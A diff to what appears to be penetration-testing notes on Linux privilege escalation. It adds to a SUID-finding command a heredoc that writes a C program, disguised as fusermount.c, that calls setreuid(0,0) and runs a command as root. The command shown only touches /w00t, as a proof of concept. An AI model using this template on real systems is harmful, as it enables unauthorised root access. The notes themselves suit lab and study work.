@@ -147,3 +147,17 @@ https://github.com/Z3R0th-13/LinEnum.git
 #SUID
 find . -perm /4000 
 
+#Cat various-lines-script in file without vim
+cat >fusermount.c<<EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(int argc, char **argv)
+{
+  setreuid(0,0);
+  system("/usr/bin/touch /w00t");
+  return(0);
+}
+EOF
